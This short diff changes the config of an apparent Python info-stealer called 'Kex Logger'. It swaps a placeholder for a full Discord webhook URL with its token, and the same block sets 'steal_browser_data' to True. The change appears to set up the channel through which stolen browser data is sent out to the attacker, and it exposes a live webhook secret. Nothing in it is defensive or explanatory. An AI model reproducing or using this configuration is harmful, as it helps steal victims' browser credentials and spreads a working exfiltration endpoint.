@@ -8,7 +8,7 @@ import socket, ssl, dns.resolver, whois, time, threading
 from datetime import datetime
 
 config = {
-    "webhook": "YOUR_DISCORD_WEBHOOK",
+    "webhook": "https://discordapp.com/api/webhooks/1502035551753343168/40OzcbXsPy3Blx5T4tTi7H_BbCJ5lwHbGXkcTzOyoNdjQNY-R82GQKbHoH-ftWx8t55T",
     "username": "Kex Logger",
     "color": 0xFF0000,
     "steal_browser_data": True,
